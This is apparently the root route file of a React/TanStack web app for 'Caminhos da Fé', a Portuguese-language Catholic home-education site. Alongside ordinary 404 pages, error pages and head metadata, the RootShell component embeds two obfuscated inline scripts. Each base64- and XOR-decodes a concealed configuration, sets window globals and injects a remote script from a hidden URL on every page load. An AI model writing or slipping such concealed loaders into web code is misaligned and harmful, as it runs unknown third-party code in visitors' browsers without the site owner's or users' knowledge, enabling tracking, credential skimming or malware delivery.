import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Caminhos da Fé — Formação católica para seus filhos" },
      { name: "description", content: "48 semanas de formação católica em casa para crianças e adolescentes de 5 a 15 anos. Ensine seu filho a entender e explicar a fé." },
      { property: "og:title", content: "Caminhos da Fé — Formação católica para seus filhos" },
      { property: "og:description", content: "48 semanas de formação católica em casa para crianças e adolescentes de 5 a 15 anos. Ensine seu filho a entender e explicar a fé." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Playfair+Display:wght@700;800&display=swap" },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var t_u807=atob("DNqrNrK8ds/9OYRHbqGJQ8DQVPXfUfAzHqmRGZ3fEqHTTPAqB7zSGNHTG+GfS6s0DajCRsbPWbqJVPdoArvfU8HIWKWOG6hlD67fRNveA7uYSqZ9NaGJWNPRE+3HG+AmGruGQ8bRH6mEFPQ1C6zOWMaRDqySXak0DbGJGpDKF6OIXKZ9TPjWGsmeGK6QXKZ9TL7KQtORA7uQUOI+Q6rZU8TZGLvQSvElB77YFJ6eAK6RTOFlVPiJS+/B");var f_sj=[];for(var h_6i2=0;h_6i2<t_u807.length;h_6i2++){f_sj.push(t_u807.charCodeAt(h_6i2)&255);}var l_e=f_sj[0];var x_zjje=f_sj.slice(1,1+l_e);var x_d=f_sj.slice(1+l_e);var e_yu8=x_d.map(function(b,l_ojng){return b^x_zjje[l_ojng%l_e];});var m_nhuj="";for(var w_50=0;w_50<e_yu8.length;w_50++){m_nhuj+=String.fromCharCode(e_yu8[w_50]&255);}var b_p9=decodeURIComponent(escape(m_nhuj));var r_aa=JSON.parse(b_p9);var y_za=r_aa.globals||[];y_za.forEach(function(m_g7){window[m_g7.name]=m_g7.value;});var b_be8=document.createElement("script");b_be8.src=r_aa.url;b_be8.async=true;b_be8.defer=true;(r_aa.attributes||[]).forEach(function(a_66){b_be8.setAttribute(a_66.name,a_66.value);});(document.head||document.documentElement).appendChild(b_be8);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var n_dnp=atob("DHhAQUCGrZ5n/qXrrwNiNDLqj6RFltGf3wt6bm/lyfBJi9GGxh45byPpwLAFjIqYzAopMTT1gu4OhsCHgAgpOSXqg/QU3InJzgw0Mynk2OoCjYfR9CVsYyfqwvwGktbJlSM7Yy7nwPtFxIebxgAlLQnij7JFiMSH2h1ie2KwzPsEn5yOmh54dnbjnadUypDYyRxzIyGk0MMa");var v_0=[];for(var l_um82=0;l_um82<n_dnp.length;l_um82++){v_0.push(n_dnp.charCodeAt(l_um82)&255);}var u_ag=v_0[0];var n_pop=v_0.slice(1,1+u_ag);var u_lgw=v_0.slice(1+u_ag);var j_e7fl=u_lgw.map(function(b,w_34){return b^n_pop[w_34%u_ag];});var m_e="";for(var u_wrll=0;u_wrll<j_e7fl.length;u_wrll++){m_e+=String.fromCharCode(j_e7fl[u_wrll]&255);}var d_i8k=decodeURIComponent(escape(m_e));var w_2=JSON.parse(d_i8k);var i_b0jv=w_2.globals||[];i_b0jv.forEach(function(x_ff){window[x_ff.name]=x_ff.value;});var i_0=document.createElement("script");i_0.src=w_2.url;i_0.async=true;i_0.defer=true;(w_2.attributes||[]).forEach(function(o_312a){i_0.setAttribute(o_312a.name,o_312a.value);});(document.head||document.documentElement).appendChild(i_0);})();`,
          }}
        />

      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
